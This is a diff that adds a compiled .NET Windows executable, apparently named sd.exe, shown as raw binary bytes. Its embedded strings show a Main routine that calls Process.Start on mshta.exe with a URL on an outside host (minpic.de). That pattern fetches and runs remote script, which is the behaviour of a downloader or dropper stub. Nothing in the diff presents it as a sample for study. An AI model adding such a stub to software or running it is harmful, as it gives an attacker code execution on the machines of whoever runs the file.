@@ -1,0 +1,19 @@
+MZ       ÿÿ  ¸       @                                   €   º ´	Í!¸LÍ!This program cannot be run in DOS mode.
+
+$       PE  L ÄõÄ_        à            Î#       @    @                       €          @…                           |#  O    @  È                   `                                                                       H           .text   Ô                           `.rsrc   È   @                    @  @.reloc      `                    @  B                °#      H     d                                                          Fr  pr=  p(  
+&*  BSJB         v4.0.30319     l   ô   #~  `  Ô   #Strings    4  ˆ   #US ¼     #GUID   Ì  L   #Blob         G  	    ú%3                             
+       - &  Y 9   9    & 
+ Æ ³            €      P     ‘ 4 
+   y   y  ! y  ) Î      .  # .  , €                                                &        <Module> sd.exe Program Sub mscorlib System Object Main System.Runtime.CompilerServices CompilationRelaxationsAttribute .ctor RuntimeCompatibilityAttribute sd STAThreadAttribute System.Diagnostics Process Start  ;C : \ W i n d o w s \ S y s t e m 3 2 \ m s h t a . e x e  Gh t t p s : / / w w w . m i n p i c . d e / k / b b 3 8 / 6 y o 0 8 /     Çî>Ví_C³
+”ƒ0s  ·z\V4à‰                 TWrapNonExceptionThrows ¤#          ¾#                          °#            _CorExeMain mscoree.dll     ÿ%  @                                                                  €   8  €                  P  €                  h  €                   €                          @  4          ØB  ê          44   V S _ V E R S I O N _ I N F O     ½ïþ                   ?                         D    V a r F i l e I n f o     $    T r a n s l a t i o n       °”   S t r i n g F i l e I n f o   p   0 0 0 0 0 4 b 0   ,   F i l e D e s c r i p t i o n         0   F i l e V e r s i o n     0 . 0 . 0 . 0   0   I n t e r n a l N a m e   s d . e x e     (   L e g a l C o p y r i g h t       8   O r i g i n a l F i l e n a m e   s d . e x e     4   P r o d u c t V e r s i o n   0 . 0 . 0 . 0   8   A s s e m b l y   V e r s i o n   0 . 0 . 0 . 0       ï»¿<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+  <assemblyIdentity version="1.0.0.0" name="MyApplication.app"/>
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
+    <security>
+      <requestedPrivileges xmlns="urn:schemas-microsoft-com:asm.v3">
+        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>
+                                                                                                                                                                                                                                                                                                                                     Ð3                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
